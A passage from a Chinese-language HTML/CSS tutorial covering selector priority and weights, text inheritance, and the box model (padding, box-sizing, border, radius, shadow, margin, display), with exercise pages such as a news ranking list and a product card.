font-size: 14px;}h3 {  font-size: 16px;  color: #404040;  font-weight: bold;}ul {    font-size: 14px;    color: #404040;}ul li .first {  font-size: 26px;  color: #f34540;}/*灰色数字*/ul li .special {  font-size: 16px;  color: #888888;}ul li .current{  font-size: 14px;  color: #f34540;}</code></pre><p>html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;练习&lt;/title&gt;    &lt;link rel="stylesheet" href="./index.css" &gt; &lt;/head&gt;&lt;body&gt;    &lt;h3&gt;热点排行&lt;/h3&gt;    &lt;ul&gt;      &lt;li&gt;&lt;span class="first"&gt;1&lt;/span&gt;校招主持称山大女生漂亮留学生幸福 涉事企业回应&lt;span class="current"&gt;96844&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="first"&gt;2&lt;/span&gt;合肥"女黑老大"获刑25年:有受害人借900万还71套房&lt;span class="current"&gt;17556&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="first"&gt;3&lt;/span&gt;女子体检发现"包块" 尚未确诊跳楼身亡&lt;span class="current"&gt;15283&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="special"&gt;4&lt;/span&gt;到银行没领到20多个鸡蛋 7旬老人被气得脑出血&lt;span class="current"&gt;7471&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="special"&gt;5&lt;/span&gt;潘石屹要清空在中国的所有核心资产？SOHO中国回应&lt;span class="current"&gt;6581&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="special"&gt;6&lt;/span&gt;40名大学生因旷课太多被学校退学 教育部回了3个字&lt;span class="current"&gt;6463&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="special"&gt;7&lt;/span&gt;云南亿万富豪被杀案:家人怀疑买凶杀人弃百万赔偿&lt;span class="current"&gt;6416&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="special"&gt;8&lt;/span&gt;与父亲争吵怄气 22岁小伙喝百草枯抢救无效死亡&lt;span class="current"&gt;5723&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="special"&gt;9&lt;/span&gt;司机被黄牛收钱后万元罚款减半 山西祁县:正在调查&lt;span class="current"&gt;5433&lt;/span&gt;&lt;/li&gt;      &lt;li&gt;&lt;span class="special"&gt;10&lt;/span&gt;蒙古国逮捕800名中国人：涉嫌从事电信诈骗活动&lt;span class="current"&gt;5425&lt;/span&gt;&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-5选择器的优先级"><a href="#6-5选择器的优先级" class="headerlink" title="6.5选择器的优先级"></a>6.5选择器的优先级</h3><h4 id="单个选择器的优先级"><a href="#单个选择器的优先级" class="headerlink" title="单个选择器的优先级"></a>单个选择器的优先级</h4><p>记住以下顺序：id选择器&gt;类选择器&gt;标签选择器</p><p>举例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;style&gt;      p{        color:blue;      }        .poem{      color: red;    }    #ch-poem{      color:purple;     }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;p class="poem" id="ch-poem"&gt;百川东到海，何时复西归？&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="文字属性的继承性"><a href="#文字属性的继承性" class="headerlink" title="文字属性的继承性"></a>文字属性的继承性</h4><p>除了<code>h</code>标签，其他的标签内写了文字后，默认会有相同的颜色、大小，这就是文字属性的继承性导致的，他们都继承了<code>body</code>标签的字体大小、颜色</p><p>我们用代码验证一下</p><pre><code>&lt;ul class="ul-item"&gt;  蒹葭  &lt;li&gt;蒹葭苍苍，白露为霜。所谓伊人，在水一方。&lt;/li&gt;  &lt;li&gt;溯洄从之，道阻且长。溯游从之，宛在水中央。&lt;/li&gt;  &lt;li&gt;蒹葭萋萋，白露未晞。所谓伊人，在水之湄。&lt;/li&gt;&lt;/ul&gt;</code></pre><p>下面我们在<code>ul</code>标签上修改文字的颜色</p><pre><code>.ul-item {  color: #ff6973;}</code></pre><p>发现我们本来想修改的”蒹葭”两个字，但是却把<code>li</code>标签内的文字颜色也一起改变了——这就是文字属性的继承性</p><h4 id="高级选择器的优先级"><a href="#高级选择器的优先级" class="headerlink" title="高级选择器的优先级"></a>高级选择器的优先级</h4><p>多个选择器的优先级如何去判断呢？</p><p>这时候需要用到选择器权重的叠加性，按照优先级越高，权重越大的规则，假设id选择器的权重是100，类选择器的权重是10，标签选择器的权重为1，我们就可以计算一下这个高级选择器的权重</p><pre><code>.param #item span {}</code></pre><p>此时的权重为111=100（#item）+10（.param）+1（span）</p><p><strong>权重的应用</strong></p><p>权重的作用是决定当两个不同的选择器给同一个标签设置了相同的属性，听谁的？</p><p>案例：</p><pre><code>&lt;ul class="ul-item"&gt;  &lt;li&gt;    &lt;p&gt;文字的颜色到底是什么颜色？&lt;/p&gt;  &lt;/li&gt;&lt;/ul&gt;ul li p {  color: blue;}p {  color: red;}</code></pre><p>最终结果得到的是蓝色的</p><p>这里我们专门设置了blue的选择器在上面。咋子这里注意层叠性只有在权重一样的情况下才会适用</p><p>接下来我们推导一下：我们知道<br><strong>权重的作用就是决定当用两个不同的选择器给同一个标签设置了相同的属性，该听谁的</strong>，根据权重的计算，第一个选择器的权重为3，第二个为1，所以最终的字体颜色是蓝色</p><p>此时我们再尝试以下内容</p><pre><code>.ul-item li {  color: blue;}p {  color: red;}</code></pre><p>发现是红色，但是根据计算第一个选择器的权重是11，第二个是1，却和我们想的不一样。</p><p>因为第一个选择器脱离了权重的适用范围，即<strong>选中</strong>，第一个选择器之选中了<code>li</code>标签，第二个选择器是直接选中了p标签。</p><p>案例：</p><pre><code>&lt;ul class="ul-item"&gt;  &lt;li class="li-item"&gt;    &lt;p&gt;文字的颜色到底是什么颜色？&lt;/p&gt;  &lt;/li&gt;&lt;/ul&gt;.ul-item .li-item {  color: yellowgreen;}.ul-item li {  color: black;}</code></pre><p>此时两个选择器都选中了<code>li</code>标签，第一个选择器的权重大，所以选中了<code>yellowgreen</code></p><h2 id="第七章：CSS-盒模型"><a href="#第七章：CSS-盒模型" class="headerlink" title="第七章：CSS-盒模型"></a>第七章：CSS-盒模型</h2><h3 id="7-1盒模型-content"><a href="#7-1盒模型-content" class="headerlink" title="7.1盒模型-content"></a>7.1盒模型-content</h3><p>我们要学习一新标签<code>div</code>，<code>div</code>可以理解为一个干净透彻的矩形。</p><h5 id="content"><a href="#content" class="headerlink" title="content"></a>content</h5><p><code>div</code>标签写出来的时候是没有高度的，但是又默认的宽度，默认与父标签的宽度是一样的。</p><p>比如</p><pre><code>&lt;ul&gt;  &lt;li&gt;    &lt;div&gt;&lt;/div&gt;  &lt;/li&gt;&lt;/ul&gt;</code></pre><p>此时<code>div</code>的默认宽度是<code>li</code>标签的宽度，这里的宽度是width属性设置的宽度</p><p>我们来画一个宽200px，高100px的矩形：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;&lt;style&gt;  .box{    width:200px;    height:100px;  }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- 定义一个div标签 --&gt;    &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>发现啥都没有哈哈哈哈</p><p>此时我们需要学习一个新的CSS属性，<code>background-color</code>——背景颜色，这个属性值跟我们设置字体颜色的时候学的一样，有十六进制，<code>rbg``rgba</code>，英文单词形式的颜色，下面是我们添加之后的效果：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;style&gt;      /*给div设置宽高，并添加背景颜色*/      .box{        width:200px;        height:100px;        background-color:purple;      }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- 定义一个div标签 --&gt;    &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="百分百尺寸"><a href="#百分百尺寸" class="headerlink" title="百分百尺寸"></a>百分百尺寸</h4><p>设置块元素的高度，不仅有<code>px</code>形式，还有<code>%</code>形式</p><pre><code>&lt;div class="father"&gt;  &lt;div class="son"&gt;&lt;/div&gt;&lt;/div&gt;.father {  width: 200px;  height: 80px;  background-color: #5b6dcd;}.son {  width: 60%;  height: 20%;  background-color: #fec03e;}</code></pre><p><strong>注意：</strong>这里的%元素是相对于父亲的，比如子元素的宽度是<code>200px * %60 = 120px</code></p><p>那么什么时候父元素的尺寸是不存在的呢？</p><p>这时候发现浏览器依然是白色的，因为<code>.bg</code>的复原色<code>body</code>的高度默认是<code>0px</code>,<code>0px</code>的百分之百还是<code>0px</code>，但是<code>body</code>的宽度还是有的，默认和浏览器页面宽度一样。</p><h3 id="7-2盒模型-padding"><a href="#7-2盒模型-padding" class="headerlink" title="7.2盒模型-padding"></a>7.2盒模型-padding</h3><p>内边距——padding</p><p>例子：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/google-padding.png" alt="image"></p><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;style&gt;      /*给矩形设置宽高、颜色和内边距*/      .box{        width:300px;        height:300px;        background-color:purple;        padding:20px;      }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;!--定义一个div标签--&gt;    &lt;div class="box"&gt;      All afternoon his tractor pulls a flat wagon with bales to the barn, then back to the waiting chopped field.       It trails a feather of smoke. Down the block we bend with the season: shoes to polish for a big game,storm windows to batten or patch.       And how like a field is the whole sky now that the maples have shed their leaves, too.    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>参考：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/padding-explore.png" alt="image"></p><blockquote><p>注意：padding区域包含在背景颜色区域内的，也就是说背影颜色包含了padding和content</p></blockquote><h4 id="padding分开写"><a href="#padding分开写" class="headerlink" title="padding分开写"></a>padding分开写</h4><p>padding默认是给矩形四周添加相同的内边距，但是我们在实际应用当中会有四周内边距不同的情况，因此我们就要分别给矩形设置内边距，没有设置的内边距默认为0。</p><pre><code>.box {    padding: 20px;}&lt;!--上面的代码等价于：--&gt;.box {    padding-top: 20px; /*上内边距*/    padding-right: 20px; /*右内边距*/    padding-bottom: 20px; /*下内边距*/    padding-left: 20px; /*左内边距*/}</code></pre><h4 id="padding简写"><a href="#padding简写" class="headerlink" title="padding简写"></a>padding简写</h4><pre><code>div{    padding:20px 20px 20px 20px;}</code></pre><p>代表上右下左，如果四个值一样就可以写成<strong>padding:20px</strong>，如果不一样可以分为以下情况</p><ol><li>上下一样，左右一样</li></ol><p>例如：</p><pre><code>div{    padding-top: 20px;    padding-bottom: 20px;    padding-left: 30px;    padding-right: 30px;}</code></pre><p>上下一样，写一个即可，同理左右也是一样</p><pre><code>div{    padding: 20px 30px;}</code></pre><ol start="2"><li>上下一样，左右不一样</li></ol><pre><code>div{    padding-top: 20px;    padding-bottom: 20px;    padding-left: 10px;    padding-right: 30px;}</code></pre><p>要写成</p><pre><code>div{    padding: 20px 30px 20px 10px;}</code></pre><ol start="3"><li>上下不一样，左右一样</li></ol><pre><code>div{    padding-top: 30px;    padding-bottom: 20px;    padding-left: 10px;    padding-right: 10px;}</code></pre><p>写成</p><pre><code>div{    padding: 30px 10px 20px;}</code></pre><p>可以这样来理解，第一一个值是上30px，第二个值是右10px，第三个值是下20px，第四个值是<br>左，但是没有，所以要跟右一致。</p><p>总结下来就是上、右、下、左按照顺序去填写,没有的值就跟对立面的值一样，下对上, 左对右。</p><h4 id="box-sizing"><a href="#box-sizing" class="headerlink" title="box-sizing"></a>box-sizing</h4><p><code>box-sizing</code>规定了如何计算一个元素的总宽度和高度，它有两个值<code>content-box</code> ，<code>border- box</code>,<br>默认是<code>content-box</code>。</p><p><code>content-box</code>尺寸计算公式:<br>width =内容的宽度<br>height =内容的高度。</p><p><code>border-box</code>尺寸计算公式:<br>width = border + padding +内容的宽度<br>height = border + padding +内容的高度</p><p>这里的内容就是我们学过的<code>content</code>,<code>border</code>属性我们还没有学,但是在这里已经可以说明一下<code>box-sizing</code>属性的性质，下一节学习<code>border</code> 的时候，我们会将<code>border</code>的尺寸也算进去。</p><pre><code>.father{    width:200px;    height: 100px;    background-color: #5C70CA; }.son{    box-sizing: content-box;    width: 100%;    height: 40px;    /* 添加padding */    padding: 0px 20px;    background-color:#FEC03E;}</code></pre><p>子元素超出的原因就是，width: 100% 属性给子元素设置了和父元素content一样的宽，又设置了<br>padding在原有的基础上又增加了左右padding超出了父元素content区域。</p><pre><code>father{    width:200px;    height: 100px;    background-color: #5C70CA; }.son{    /* 修改box-sizing */    box-sizing: border-box;    width: 100%;    height: 40px;    /* 添加padding */    padding: 0px 20px;    background-color:#FEC03E;}</code></pre><p><code>border-box</code>的<code>width</code>包含了<code>content</code>、<br><code>padding</code>、 <code>border</code> ，所以设置<code>padding</code>,<br><code>border</code>后不会<br>溢出父元素的<code>content</code>。</p><h3 id="7-3盒模型——border"><a href="#7-3盒模型——border" class="headerlink" title="7.3盒模型——border"></a>7.3盒模型——border</h3><p>边框——border：包裹在<code>padding</code>外面的一层线</p><h4 id="给矩形设置边框线"><a href="#给矩形设置边框线" class="headerlink" title="给矩形设置边框线"></a>给矩形设置边框线</h4><pre><code>.box {  /* 设置矩形大小 */  width: 200px;  height: 30px;  /* 设置边框线 */  border-width: 2px;  border-color: grey;  border-style: solid;}</code></pre><ul><li><code>border-width</code>：边框的粗细</li><li><code>border-color</code>：边框的颜色</li><li><code>border-style</code>：边框的线行，solid为实线，dashed为虚线</li></ul><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;&lt;style&gt;  .box{    /*设置矩形的宽*/    width:300px;    /*设置矩形的高*/    height:150px;    /*设置矩形的背景颜色*/    background-color:white;    /*设置矩形的边框*/    border-width:2px;    border-color:black;    border-style:solid;  }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;!-- 定义一个div标签 --&gt;  &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="边框的简写"><a href="#边框的简写" class="headerlink" title="边框的简写"></a>边框的简写</h4><pre><code>.box {  border: 2px solid blue;}</code></pre><p>顺序可以忽略</p><h4 id="分别设置边框"><a href="#分别设置边框" class="headerlink" title="分别设置边框"></a>分别设置边框</h4><p>方法：</p><pre><code>.box {  /* 添加顶部border */  border-top: 1px solid black;  /*添加右侧border*/  border-right: 3px solid orange;  /*添加底部border*/  border-bottom: 5px dashed pink;  /*添加左侧border*/  border-left: 10px dashed purple;}</code></pre><h4 id="利用层叠性设置边框"><a href="#利用层叠性设置边框" class="headerlink" title="利用层叠性设置边框"></a>利用层叠性设置边框</h4><p>在实际应用当中，我们可能会遇到这样一种情况， 要设置一个 矩形,<br>矩形的左、右、上的边框样式是相同的,但是下边框的样式是不一样的。</p><p>这时候我们就可以用属性的层叠性来实现，核心代码如下:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;&lt;style&gt;  .box{    /*设置矩形的宽*/    width:300px;    /*设置矩形的高*/    height:300px;    /*设置矩形的背景颜色*/    background-color:white;    /*设置矩形的边框*/    /*统一设置矩形的所有边框样式*/    border:2px solid black;    /*重新设置一个下边框的样式来层叠掉统一设置的边框的样式*/    border-bottom:5px solid orange;  }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;!-- 定义一个div标签 --&gt;  &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="无边框"><a href="#无边框" class="headerlink" title="无边框"></a>无边框</h4><pre><code>.box {  border-bottom: none;}</code></pre><h4 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a>圆角</h4><p>在很多场景下，矩形一般都不是四四方方的，需要一点点的圆角来点缀，圆角的属性是归类于边框的，即border-radius。有了之前的基础，相信圆角对大家来说很好理解。</p><p>设置方法：</p><pre><code>.box {  border-radius: 12px;}</code></pre><p>案例：</p><pre><code>div {  width: 200px;  height: 200px;  background-color: violet;  border-radius: 18px;}</code></pre><p><strong>圆角分开设置</strong></p><pre><code>.box {  width: 200px;  height: 200px;  background-color: violet;  border-top-left-radius: 5px;  border-top-right-radius: 10px;  border-bottom-left-radius: 20px;  border-bottom-right-radius: 15px;}</code></pre><h4 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h4><pre><code>&lt;div class="box"&gt;&lt;/div&gt;.box {  width: 200px;  height: 200px;  border: 1px solid #c4c4c4;  /* x偏移量 | y偏移量 | 阴影模糊半径 | 阴影扩散半径 | 阴影颜色 */  box-shadow: 2px 2px 2px 1px rgba(0, 0, 0, 0.2);  border-radius: 15px;}</code></pre><p>阴影的实现原理可以看作是在矩形下面有一一个重叠的，同样大小的矩形，如果它在x轴、y轴上移动，就会有阴影的效果。</p><ul><li>x偏移量:在x轴上移动，向右为正</li><li>y偏移量:在y轴上移动，向下为正</li><li>阴影模糊半径:就是边线的清晰度</li><li>阴影扩散半径:就是向外伸展</li><li>阴影颜色:就是矩形下面那个矩形的背景色。</li></ul><p>案例：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/exercse-pic/7-3-1-%E8%AE%BE%E8%AE%A1%E5%9B%BE.png" alt="image"></p><p>页面中:</p><ul><li>蓝色的背景颜色为:</li></ul><p><code>##0091ff</code></p><ul><li>黑色文字颜色为: #333333，白色文字颜色为: f#ffff</li><li>字体大小为:16px</li></ul><p>index.css</p><pre><code>ul {  list-style: none;  padding: 0px;  margin: 0px;  color: #333333;  font-size: 16px;  border: 1px solid #a4a4a4;  display: inline-block;}ul li {  /*         display:inline-block可以让一个块元素和行内元素在同一行显示        具有想同属性的块元素也可以并排显示    */  display: inline-block;  padding-left: 15px;  padding-right: 15px;  line-height: 60px;}ul li.current {  color: #ffffff;  background-color: #0091ff;}</code></pre><p>index.html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;练习&lt;/title&gt;    &lt;link rel="stylesheet" href="index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul&gt;        &lt;li class="current"&gt;首页&lt;/li&gt;        &lt;li&gt;优课达学院&lt;/li&gt;        &lt;li&gt;App下载&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>案例：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/exercse-pic/3-2%E8%AE%BE%E8%AE%A1%E5%9B%BE.png" alt="image"></p><ul><li>矩形阴影的x轴偏移量为0, y轴偏移量为<br>1px，模糊度为17px,不扩散,阴影颜色<br>为rgb(0, 0, 0)，透明度为0.1 </li><li>矩形圆角为7px</li><li>“教学目标”文字的字体大小为14px,字<br>体颜色为rgb(0,0,0)透明度为0.65,文字<br>居中显示<br>介绍内容的文字字体大小为12px,文字<br>颜色为#2c2c2c</li></ul><p>提示:</p><p>P、h、ul、|等标签有自己默认的margin.<br>padding,请用选择器将默认的值先设置为0<br>之后，再进行布局，如果你用的是div标签,<br>则不需要做这一步。</p><p>index.css</p><pre><code>h3,p {  margin: 0;  padding: 0;}.box {  box-sizing: border-box;  width: 280px;  box-shadow: 0 1px 17px 0 rgba(0, 0, 0, 0.1);  padding: 15px;  border-radius: 7px;}.box .title {  font-size: 14px;  color: rgba(0, 0, 0, 0.65);  text-align: center;}.box p {  font-size: 12px;  color: #2c2c2c;  padding-top: 15px;}</code></pre><p>html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;练习&lt;/title&gt;    &lt;link rel="stylesheet" href="index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class="box"&gt;        &lt;h3 class="title"&gt;教学目标&lt;/h3&gt;        &lt;p&gt;统地学习数据体系：MySQL、Redis、Mongodb 并深入全栈能力包括 Vue 框架和 SSM        框架（Spring、SpringMVC、MyBatis），掌握处理大数据的能力，可以独立完成复杂而真实的项目，比如美团外卖。        &lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="7-4盒模型——margin"><a href="#7-4盒模型——margin" class="headerlink" title="7.4盒模型——margin"></a>7.4盒模型——margin</h3><p>margin-外边距：矩形与矩形之间的距离<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/margin1.png" alt="image"></p><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;style&gt;        div {            width: 300px;            height: 100px;            background-color: #D5E8D4;            border: 1px solid #82B366;        }        .box{          background-color: #F5F5F5;          border: 1px solid #FF0818;          margin-top: 20px;          margin-bottom: 20px;        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;&lt;/div&gt;    &lt;div class="box"&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="两个盒子之间margin的计算"><a href="#两个盒子之间margin的计算" class="headerlink" title="两个盒子之间margin的计算"></a>两个盒子之间margin的计算</h4><h5 id="水平距离"><a href="#水平距离" class="headerlink" title="水平距离"></a><strong>水平距离</strong></h5><p>首先我们来看最容易理解的水平距离，下图中， 第-个盒子的右margin为30px，第二个盒子的左margin为20x，那么最后两个盒子之间的水平距离就是30px+ 20px=50px;如果第二个盒子没有设置magrin-left,那么默认为第二个盒子的margin-left为0px。</p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/leftandrightmargin.png" alt="image"></p><h5 id="垂直距离"><a href="#垂直距离" class="headerlink" title="垂直距离"></a><strong>垂直距离</strong></h5><p>水平距离很符合我们的常规理解，但是垂直距离就略有不同，垂直距离取两个盒子margin的最大值。</p><p>如下图所示，首先，只给其中一个盒子设置margin-bottom,两个盒子之间的垂直距离就是第一个盒子的margin-bottom;</p><p>然后,给第二个盒子设置一个margin-top,但是值小于第一个 盒子的margin-bottom的值，得到两个盒子之间的垂直距离，是取两个margin的最大值;最后，将下方盒子的margin-top设置为50px,大于第一个 盒子的margin-bottom,两盒子之间的垂直距离变成了50px。<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/max_margin.png" alt="image"></p><h4 id="盒子左右居中"><a href="#盒子左右居中" class="headerlink" title="盒子左右居中"></a>盒子左右居中</h4><p>margin还有-个作用就是使盒子可以在父盒子中左右居中，但是有一个前提，就是必须有宽度。</p><p>案例：</p><pre><code>&lt;div class="father"&gt;     &lt;div class="son"&gt;&lt;/div&gt;&lt;/div&gt;.father{    width:400px;    height:200px;    border: 1px solid #ccc;}.son{    width:200px;    height:100px;    margin:0 auto;    border: 1px solid #ccc;}</code></pre><p>案例：</p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/exercse-pic/4-1-%E8%AE%BE%E8%AE%A1%E5%9B%BE1.png" alt="image"></p><p>题目要求：</p><ul><li><p>边框颜色为#c4c4c4,粗细为1px,实线</p></li><li><p>鞋子描述，字体大小为14px,字体颜色为</p></li></ul><p><code>#333333</code>,行高20px,超出部分要隐藏，字区域宽度为135px</p><ul><li>价格文字大小为18px，字体颜色为#FF0036,行高18px </li></ul><p>css:</p><pre><code>.box{  width:234px;  box-sizing: border-box;  border: 1px solid #c4c4c4;  padding: 20px 0px;  text-align: center;}div img{  width: 185px;  height: 185px;}.troduction{  font-size: 14px;  color: #333333;  line-height: 20px;  width: 135px;  margin: 8px auto;}.price {  font-size: 18px;  color: #FF0036;  margin: 10px auto 0;  line-height: 18px;}</code></pre><p>html:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;link rel="stylesheet" href="./index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class = "box"&gt;        &lt;img src="https://gw.alicdn.com/bao/uploaded/i1/749716436/O1CN01OSPWqa1xPjeErSSzf_!!749716436-0-pixelsss.jpg"&gt;        &lt;!-- 图片链接地址为：https://gw.alicdn.com/bao/uploaded/i1/749716436/O1CN01OSPWqa1xPjeErSSzf_!!749716436-0-pixelsss.jpg --&gt;        &lt;div class = "introduction"&gt;人本春季红色帆布鞋男网红休闲布鞋潮鞋百搭运动小白鞋子男运动鞋&lt;/div&gt;        &lt;div class="price"&gt;¥78.3&lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="7-5-盒模型——display-block-none"><a href="#7-5-盒模型——display-block-none" class="headerlink" title="7.5 盒模型——display:block/none"></a>7.5 盒模型——display:block/none</h3><h4 id="display-block"><a href="#display-block" class="headerlink" title="display:block"></a>display:block</h4><p><strong>块元素性质一——独占一行</strong></p><p><strong>块元素性质二——可以设置宽高</strong></p><p>做一个对比</p><p>行内标签span:</p><pre><code>&lt;span class="demo"&gt;        这是一个span标签&lt;/span&gt;.demo{    width:300px;    height:100px;    background-color:#FFF2CC}</code></pre><p>发现宽与高不会生效</p><p>再试div标签</p><pre><code>&lt;div class="demo"&gt;     这是一个div标签&lt;/div&gt;.demo{    width:300px;    height:100px;    background-color:#FFF2CC}</code></pre><p>发现其宽与高生效了</p><p>标签是行内元素还是块元素，其根本原因就是标签</p><p>自带的默认display属性:</p><ul><li>块元素默认的display属性的值是block</li><li>行内元素默认的display属性的值是inline</li></ul><p><strong>行内元素转块元素</strong><br>接_上面的那个案例，我们要想给span<br>标签设置宽、高，首先要让<code>span</code>标签转换成块元素，然后再给它设置宽高,我们的做法是这样:</p><pre><code>&lt;span class="demo"&gt;        这是一个span标签&lt;/span&gt;.demo{    /*将span标签转换成块元素*/    display: block;    width: 300px;    height: 100px;    background-color: #FFF2CC}</code></pre><p><strong>块内元素转行内元素</strong></p><p>行内元素可以通过display属性转换成块元素，从而达到设置宽高的目的，那么我们也可以用这个方法让块元素失去设置宽高的能力，我们的做法是这样:</p><pre><code>&lt;div class="demo"&gt;        这是一个span标签&lt;/div&gt;.demo{    /*将div标签转换成行内元素*/    display: inline;    /* 转换成行内元素以后，宽、高的设置就会失效，即使我们仍然设置了它们 */    width: 300px;    height: 100px;    /* 背景颜色也不会是300*100范围，而是文字有多少面积，背景颜色就又多少面积 */    background-color: #FFF2CC}</code></pre><h5 id="display-none"><a href="#display-none" class="headerlink" title="display:none;"></a>display:none;</h5><p><code>none</code>就是无的意思，也就是说，当给标签设置了这个属性值，标签就会消失，在网页布局中最常用的就是用<code>none</code>、<code>block</code>来控制元素的显示和隐藏。</p><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;style&gt;        div {            width: 300px;            height: 100px;            /* 使用margin属性让文字左右居中 */            text-align: center;            margin-bottom: 10px;            background-color: #D5E8D4;            /* 使用行高让文字上下居中 */            line-height: 100px;        }        .box2{          display: none;        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;盒子1&lt;/div&gt;    &lt;div class="box2"&gt;盒子2&lt;/div&gt;    &lt;div&gt;盒子3&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>案例：</p><pre><code>div {    width: 300px;    height: 50px;    background-color: #FFCE9F;}a {    text-decoration: none;    color: #666666;}.notes {  display:inline;}.link {  display: block;  width: 100px;  height: 50px;  margin-top: 10px;  background-color: #B0E3E6;  text-align: center;  line-height: 50px;}</code></pre><h3 id="7-6盒模型——display-inline-inline-block"><a href="#7-6盒模型——display-inline-inline-block" class="headerlink" title="7.6盒模型——display:inline/inline-block"></a>7.6盒模型——display:inline/inline-block</h3><h4 id="1-行内元素不能设置宽、高"><a href="#1-行内元素不能设置宽、高" class="headerlink" title="1. 行内元素不能设置宽、高;"></a>1. 行内元素不能设置宽、高;</h4><h4 id="2-行内元素可以设置padding"><a href="#2-行内元素可以设置padding" class="headerlink" title="2.行内元素可以设置padding"></a>2.行内元素可以设置<code>padding</code></h4><pre><code>&lt;a href="#"&gt;超链接&lt;/a&gt;a {  background-color: #fff2cc;  padding: 